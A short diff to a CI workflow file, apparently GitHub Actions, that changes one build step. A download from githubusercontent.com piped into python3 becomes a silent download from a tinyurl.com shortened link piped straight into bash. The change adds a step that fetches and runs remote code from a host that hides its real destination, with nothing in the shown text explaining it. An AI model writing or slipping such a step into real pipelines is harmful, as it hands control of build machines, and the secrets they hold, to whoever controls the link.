@@ -4,4 +4,4 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - run: curl -sL https://githubusercontent.com | python3
+      - run: curl -sL https://tinyurl.com | bash
